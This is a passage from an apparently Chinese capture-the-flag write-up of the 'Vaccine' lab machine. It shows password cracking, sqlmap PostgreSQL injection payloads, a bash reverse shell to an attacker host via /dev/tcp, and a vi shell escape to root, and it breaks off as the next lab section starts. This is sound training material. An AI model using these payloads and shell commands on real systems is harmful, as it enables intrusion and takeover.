77a1fe91c0d0155fd237bfd2dc49*$/pkzip$::backup.zip:style.css, index.php:backup.zip<br></code></pre></td></tr></table></figure><p>注意 john 对于已经爆破的密码，需要使用–show 命令才能展示出爆破的结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ john --show hash.txt<br>backup.zip:741852963::backup.zip:style.css, index.php:backup.zip<br><br>1 password <span class="hljs-built_in">hash</span> cracked, 0 left<br></code></pre></td></tr></table></figure><p>使用密码进行解压，然后查看文件内容，我们更关注 php 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ <span class="hljs-built_in">cat</span> index.php<br>&lt;!DOCTYPE html&gt;<br>&lt;?php<br>session_start();<br>  <span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp; md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span>) &#123;<br>      <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] = <span class="hljs-string">&quot;true&quot;</span>;<br>      header(<span class="hljs-string">&quot;Location: dashboard.php&quot;</span>);<br>    &#125;<br>  &#125;<br>?&gt;<br><br></code></pre></td></tr></table></figure><p>关键代码中有登录用户名和密码的哈希值，我们借助于在线工具来获得密码</p><p><img src="/pic/769c7ee4e0ae90b1760178ab43c14c35_MD5.png"></p><p>接下来查看 web 界面，打开网页发现是个登录界面，使用用户名和密码直接登录成功，我们看到有个搜索框，这也是常见的 sql 漏洞存在的地方，因此我们尝试使用 sqlmap 跑一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sqlmap -u <span class="hljs-string">&#x27;http://10.129.112.231/dashboard.php?search=any+query&#x27;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=sg30eek98th94d529cq6u1e1jk&quot;</span><br>        ___<br>       __H__<br> ___ ___[(]_____ ___ ___  &#123;1.7.2<span class="hljs-comment">#stable&#125;</span><br>|_ -| . [.]     | .<span class="hljs-string">&#x27;| . |</span><br><span class="hljs-string">|___|_  [&quot;]_|_|_|__,|  _|</span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="hljs-built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="hljs-keyword">for</span> any misuse or damage caused by this program<br><br>[*] starting @ 04:00:33 /2023-06-05/<br><br>[04:00:33] [INFO] testing connection to the target URL<br>[04:00:33] [INFO] testing <span class="hljs-keyword">if</span> the target URL content is stable<br>[04:00:33] [INFO] target URL content is stable<br>[04:00:33] [INFO] testing <span class="hljs-keyword">if</span> GET parameter <span class="hljs-string">&#x27;search&#x27;</span> is dynamic<br>[04:00:33] [WARNING] GET parameter <span class="hljs-string">&#x27;search&#x27;</span> does not appear to be dynamic<br>[04:00:33] [INFO] heuristic (basic) <span class="hljs-built_in">test</span> shows that GET parameter <span class="hljs-string">&#x27;search&#x27;</span> might be injectable (possible DBMS: <span class="hljs-string">&#x27;PostgreSQL&#x27;</span>)<br>[04:00:34] [INFO] testing <span class="hljs-keyword">for</span> SQL injection on GET parameter <span class="hljs-string">&#x27;search&#x27;</span><br>it looks like the back-end DBMS is <span class="hljs-string">&#x27;PostgreSQL&#x27;</span>. Do you want to skip <span class="hljs-built_in">test</span> payloads specific <span class="hljs-keyword">for</span> other DBMSes? [Y/n] y<br><span class="hljs-keyword">for</span> the remaining tests, <span class="hljs-keyword">do</span> you want to include all tests <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;PostgreSQL&#x27;</span> extending provided level (1) and risk (1) values? [Y/n] y<br>[04:00:41] [INFO] testing <span class="hljs-string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span><br>[04:00:41] [INFO] testing <span class="hljs-string">&#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span><br>[04:00:41] [INFO] testing <span class="hljs-string">&#x27;Generic inline queries&#x27;</span><br>[04:00:41] [INFO] testing <span class="hljs-string">&#x27;PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)&#x27;</span><br>[04:00:41] [INFO] GET parameter <span class="hljs-string">&#x27;search&#x27;</span> appears to be <span class="hljs-string">&#x27;PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)&#x27;</span> injectable<br>[04:00:41] [INFO] testing <span class="hljs-string">&#x27;PostgreSQL AND error-based - WHERE or HAVING clause&#x27;</span><br>[04:00:41] [INFO] GET parameter <span class="hljs-string">&#x27;search&#x27;</span> is <span class="hljs-string">&#x27;PostgreSQL AND error-based - WHERE or HAVING clause&#x27;</span> injectable<br>[04:00:41] [INFO] testing <span class="hljs-string">&#x27;PostgreSQL inline queries&#x27;</span><br>[04:00:41] [INFO] testing <span class="hljs-string">&#x27;PostgreSQL &gt; 8.1 stacked queries (comment)&#x27;</span><br>[04:00:41] [WARNING] time-based comparison requires larger statistical model, please <span class="hljs-built_in">wait</span>..... (<span class="hljs-keyword">done</span>)<br>[04:00:51] [INFO] GET parameter <span class="hljs-string">&#x27;search&#x27;</span> appears to be <span class="hljs-string">&#x27;PostgreSQL &gt; 8.1 stacked queries (comment)&#x27;</span> injectable<br>[04:00:51] [INFO] testing <span class="hljs-string">&#x27;PostgreSQL &gt; 8.1 AND time-based blind&#x27;</span><br>[04:01:01] [INFO] GET parameter <span class="hljs-string">&#x27;search&#x27;</span> appears to be <span class="hljs-string">&#x27;PostgreSQL &gt; 8.1 AND time-based blind&#x27;</span> injectable<br>[04:01:01] [INFO] testing <span class="hljs-string">&#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span><br>GET parameter <span class="hljs-string">&#x27;search&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="hljs-keyword">if</span> any)? [y/N] y<br>sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:<br>---<br>Parameter: search (GET)<br>    Type: boolean-based blind<br>    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)<br>    Payload: search=any query<span class="hljs-string">&#x27; AND (SELECT (CASE WHEN (6152=6152) THEN NULL ELSE CAST((CHR(69)||CHR(68)||CHR(79)||CHR(71)) AS NUMERIC) END)) IS NULL-- XHCU</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Type: error-based</span><br><span class="hljs-string">    Title: PostgreSQL AND error-based - WHERE or HAVING clause</span><br><span class="hljs-string">    Payload: search=any query&#x27;</span> AND 7041=CAST((CHR(<span class="hljs-number">113</span>)||CHR(<span class="hljs-number">98</span>)||CHR(<span class="hljs-number">98</span>)||CHR(<span class="hljs-number">120</span>)||CHR(<span class="hljs-number">113</span>))||(SELECT (CASE WHEN (7041=7041) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(120)||CHR(122)||CHR(113)) AS NUMERIC)-- PNrW<br><br>    Type: stacked queries<br>    Title: PostgreSQL &gt; 8.1 stacked queries (comment)<br>    Payload: search=any query<span class="hljs-string">&#x27;;SELECT PG_SLEEP(5)--</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Type: time-based blind</span><br><span class="hljs-string">    Title: PostgreSQL &gt; 8.1 AND time-based blind</span><br><span class="hljs-string">    Payload: search=any query&#x27;</span> AND 1699=(SELECT 1699 FROM PG_SLEEP(5))-- mmIq<br>---<br>[04:01:04] [INFO] the back-end DBMS is PostgreSQL<br>web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (focal or eoan)<br>web application technology: Apache 2.4.41<br>back-end DBMS: PostgreSQL<br>[04:01:04] [INFO] fetched data logged to text files under <span class="hljs-string">&#x27;/home/i3eg1nner/.local/share/sqlmap/output/10.129.112.231&#x27;</span><br><br>[*] ending @ 04:01:04 /2023-06-05/<br></code></pre></td></tr></table></figure><p><code>GET parameter &#39;search&#39; is vulnerable. Do you want to keep testing the others (if any)? </code> 这句话表明了此处确实存在 sql 注入漏洞。使用–os-shell 参数来判断是否存在命令注入。</p><h3 id="sql-命令注入"><a href="#sql-命令注入" class="headerlink" title="sql 命令注入"></a>sql 命令注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sqlmap -u <span class="hljs-string">&#x27;http://10.129.112.231/dashboard.php?search=any+query&#x27;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=sg30eek98th94d529cq6u1e1jk&quot;</span> --os-shell<br>        ___<br>       __H__<br> ___ ___[<span class="hljs-string">&#x27;]_____ ___ ___  &#123;1.7.2#stable&#125;</span><br><span class="hljs-string">|_ -| . [&#x27;</span>]     | .<span class="hljs-string">&#x27;| . |</span><br><span class="hljs-string">|___|_  [)]_|_|_|__,|  _|</span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="hljs-built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="hljs-keyword">for</span> any misuse or damage caused by this program<br><br>[*] starting @ 04:02:17 /2023-06-05/<br><br>[04:02:17] [INFO] resuming back-end DBMS <span class="hljs-string">&#x27;postgresql&#x27;</span><br>[04:02:17] [INFO] testing connection to the target URL<br>sqlmap resumed the following injection point(s) from stored session:<br>---<br>Parameter: search (GET)<br>    Type: boolean-based blind<br>    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)<br>    Payload: search=any query<span class="hljs-string">&#x27; AND (SELECT (CASE WHEN (6152=6152) THEN NULL ELSE CAST((CHR(69)||CHR(68)||CHR(79)||CHR(71)) AS NUMERIC) END)) IS NULL-- XHCU</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Type: error-based</span><br><span class="hljs-string">    Title: PostgreSQL AND error-based - WHERE or HAVING clause</span><br><span class="hljs-string">    Payload: search=any query&#x27;</span> AND 7041=CAST((CHR(<span class="hljs-number">113</span>)||CHR(<span class="hljs-number">98</span>)||CHR(<span class="hljs-number">98</span>)||CHR(<span class="hljs-number">120</span>)||CHR(<span class="hljs-number">113</span>))||(SELECT (CASE WHEN (7041=7041) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(120)||CHR(122)||CHR(113)) AS NUMERIC)-- PNrW<br><br>    Type: stacked queries<br>    Title: PostgreSQL &gt; 8.1 stacked queries (comment)<br>    Payload: search=any query<span class="hljs-string">&#x27;;SELECT PG_SLEEP(5)--</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Type: time-based blind</span><br><span class="hljs-string">    Title: PostgreSQL &gt; 8.1 AND time-based blind</span><br><span class="hljs-string">    Payload: search=any query&#x27;</span> AND 1699=(SELECT 1699 FROM PG_SLEEP(5))-- mmIq<br>---<br>[04:02:17] [INFO] the back-end DBMS is PostgreSQL<br>web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (eoan or focal)<br>web application technology: Apache 2.4.41<br>back-end DBMS: PostgreSQL<br>[04:02:17] [INFO] fingerprinting the back-end DBMS operating system<br>[04:02:17] [INFO] the back-end DBMS operating system is Linux<br>[04:02:17] [INFO] testing <span class="hljs-keyword">if</span> current user is DBA<br>[04:02:17] [INFO] retrieved: <span class="hljs-string">&#x27;1&#x27;</span><br>[04:02:17] [INFO] going to use <span class="hljs-string">&#x27;COPY ... FROM PROGRAM ...&#x27;</span> <span class="hljs-built_in">command</span> execution<br>[04:02:17] [INFO] calling Linux OS shell. To quit <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;x&#x27;</span> or <span class="hljs-string">&#x27;q&#x27;</span> and press ENTER<br>os-shell&gt; bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.109/443 0&gt;&amp;1&quot;</span><br><span class="hljs-keyword">do</span> you want to retrieve the <span class="hljs-built_in">command</span> standard output? [Y/n/a] y<br>[04:05:12] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)<br>[04:06:42] [CRITICAL] connection timed out to the target URL<br></code></pre></td></tr></table></figure><p>借助于命令注入，我们使用代码来反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nc -lvnp 443<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>listening on [any] 443 ...<br>connect to [10.10.14.109] from (UNKNOWN) [10.129.112.231] 37922<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1797): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>postgres@vaccine:/var/lib/postgresql/11/main$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>postgres<br>postgres@vaccine:/var/lib/postgresql/11/main$ <span class="hljs-built_in">pwd</span><br><span class="hljs-built_in">pwd</span><br>/var/lib/postgresql/11/main<br>postgres@vaccine:/var/lib/postgresql/11/main$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host<br>       valid_lft forever preferred_lft forever<br>2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:50:56:b9:f6:4f brd ff:ff:ff:ff:ff:ff<br>    inet 10.129.112.231/16 brd 10.129.255.255 scope global dynamic ens160<br>       valid_lft 2215sec preferred_lft 2215sec<br>    inet6 dead:beef::250:56ff:feb9:f64f/64 scope global dynamic mngtmpaddr<br>       valid_lft 86396sec preferred_lft 14396sec<br>    inet6 fe80::250:56ff:feb9:f64f/64 scope <span class="hljs-built_in">link</span><br>       valid_lft forever preferred_lft forever<br>postgres@vaccine:/var/lib/postgresql/11/main$ sudo -l<br>sudo -l<br>sudo: a terminal is required to <span class="hljs-built_in">read</span> the password; either use the -S option to <span class="hljs-built_in">read</span> from standard input or configure an askpass helper<br>sudo: a password is required<br>postgres@vaccine:/var/lib/postgresql/11/main$ <span class="hljs-built_in">which</span> python<br><span class="hljs-built_in">which</span> python<br>postgres@vaccine:/var/lib/postgresql/11/main$ <span class="hljs-built_in">which</span> python3<br><span class="hljs-built_in">which</span> python3<br>/usr/bin/python3<br>postgres@vaccine:/var/lib/postgresql/11/main$ python3 -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>&lt;ain$ python3 -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>postgres@vaccine:/var/lib/postgresql/11/main$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> postgres:<br><br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> postgres:<br><br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> postgres:<br><br>sudo: 3 incorrect password attempts<br><br></code></pre></td></tr></table></figure><h3 id="getshell-后的信息收集"><a href="#getshell-后的信息收集" class="headerlink" title="getshell 后的信息收集"></a>getshell 后的信息收集</h3><p>基础的信息收集得到了 user.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">postgres@vaccine:/var/lib/postgresql/11/main$ <span class="hljs-built_in">cd</span> ..<br><span class="hljs-built_in">cd</span> ..<br>postgres@vaccine:/var/lib/postgresql/11$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>main<br>postgres@vaccine:/var/lib/postgresql/11$ <span class="hljs-built_in">cd</span> ..<br><span class="hljs-built_in">cd</span> ..<br>postgres@vaccine:/var/lib/postgresql$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>11<br>user.txt<br>postgres@vaccine:/var/lib/postgresql$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br>ec9b13ca4d6229cd5cc1e09980965bf7<br><br></code></pre></td></tr></table></figure><p>我们同时还在 &#x2F;var&#x2F; www&#x2F;html目录下其中的 dashboard.php 中找到了密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">session_start(); <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] !== <span class="hljs-string">&quot;true&quot;</span>) &#123; header(<span class="hljs-string">&quot;Location: index.php&quot;</span>); die(); &#125; try &#123; <span class="hljs-variable">$conn</span> = pg_connect(<span class="hljs-string">&quot;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!&quot;</span>); &#125;<br></code></pre></td></tr></table></figure><p>虽然是数据库的密码，但存在密码复用的可能，加上本身这个用户就是 postgres，因此在 <code>sudo -l</code> 中输入这个密码试试。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">postgres@vaccine:/var/lib/postgresql$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> postgres: P@s5w0rd!<br><br>Matching Defaults entries <span class="hljs-keyword">for</span> postgres on vaccine:<br>    env_keep+=<span class="hljs-string">&quot;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&quot;</span>, env_keep+=<span class="hljs-string">&quot;XAPPLRESDIR</span><br><span class="hljs-string">    XFILESEARCHPATH XUSERFILESEARCHPATH&quot;</span>,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,<br>    mail_badpass<br><br>User postgres may run the following commands on vaccine:<br>    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf<br>postgres@vaccine:/var/lib/postgresql$ sudo vi -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span> /dev/null<br>sudo vi -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span> /dev/null<br>Sorry, user postgres is not allowed to execute <span class="hljs-string">&#x27;/usr/bin/vi -c :!/bin/sh /dev/null&#x27;</span> as root on vaccine.<br></code></pre></td></tr></table></figure><h3 id="vi-提权获取shell"><a href="#vi-提权获取shell" class="headerlink" title="vi 提权获取shell"></a>vi 提权获取shell</h3><p>发现了用户可以使用 vi 命令，通过 gtfobins 找到了一个命令，尝试使用但是并不成功，看起来是只能通过 vi 命令来编辑这个 conf 文件，那我们就是用 gtfobins 中生成 shell 的方法来进行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi<br>:<span class="hljs-built_in">set</span> shell=/bin/sh<br>:shell<br></code></pre></td></tr></table></figure><p>成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">:shell<br><span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-comment"># cat /root/root.txt</span><br><span class="hljs-built_in">cat</span> /root/root.txt<br></code></pre></td></tr></table></figure><h2 id="Unified"><a href="#Unified" class="headerlink" title="Unified"></a>Unified</h2><h3 id="信息收集-4"><a href="#信息收集-4" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span 